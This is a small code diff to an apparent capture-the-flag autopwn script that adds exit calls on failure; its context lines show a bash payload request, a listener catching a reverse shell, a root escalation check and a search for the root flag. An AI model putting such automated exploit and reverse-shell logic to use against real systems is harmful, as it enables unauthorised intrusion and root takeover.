@@ -93,6 +93,7 @@ class HeadlessAutopwn:
             bash_request.start()
         except Exception as e:
             log.error('There was an issue with bash payload request.')
+            sys.exit(1)
 
 
         with listen(self.lport) as shell:
@@ -129,6 +130,7 @@ class HeadlessAutopwn:
                     log.success('Root access obtained!')
                 else:
                     log.error('Exploit Failed. Reason: Root access could not be obtained.')
+                    sys.exit(1)
                 
                 log.success('Seeking root flag...')
 
